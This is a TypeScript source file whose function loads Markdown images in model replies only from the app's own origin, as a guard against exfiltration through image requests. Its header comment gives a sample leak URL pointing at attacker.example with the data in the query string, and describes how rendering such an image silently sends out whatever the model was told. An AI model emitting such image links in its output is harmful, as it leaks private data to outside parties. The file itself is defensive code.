/**
 * Model output is untrusted. A Markdown image such as ![x](https://attacker.example/p.png?q=<data>)
 * makes the browser send a request the moment the reply renders, which is a silent channel for
 * leaking whatever the model was told. So an image is only ever loaded when it points at this
 * app's own origin; every other address (remote, protocol-relative, data:, javascript:, blob:, ...)
 * is shown as its description text instead.
 *
 * This is enforced in the renderer in addition to the CSP (img-src 'self' data:), not instead of it.
 */
const LOCAL_BASE = "http://local.invalid";

export type ImageDecision = { kind: "image"; src: string } | { kind: "blocked"; alt: string };

export function decideImage(src: string | undefined, alt: string | undefined): ImageDecision {
    const description = alt ?? "";
    if (!src) return { kind: "blocked", alt: description };

    // Browsers ignore tabs/newlines and leading control characters inside URLs; reject them outright.
    // eslint-disable-next-line no-control-regex
    if (/[\u0000-\u001f\u007f]/.test(src) || src !== src.trim()) return { kind: "blocked", alt: description };

    // Only a path on this origin qualifies: "/img.png", "./img.png", "img.png", "../img.png".
    // "//host/x" and "/\host/x" resolve to another host, and any "scheme:" resolves to another origin.
    let resolved: URL;
    try {
        resolved = new URL(src, LOCAL_BASE);
    } catch {
        return { kind: "blocked", alt: description };
    }
    if (resolved.origin !== LOCAL_BASE || src.startsWith("//") || /^[\\/]{2}/.test(src)) {
        return { kind: "blocked", alt: description };
    }
    return { kind: "image", src };
}
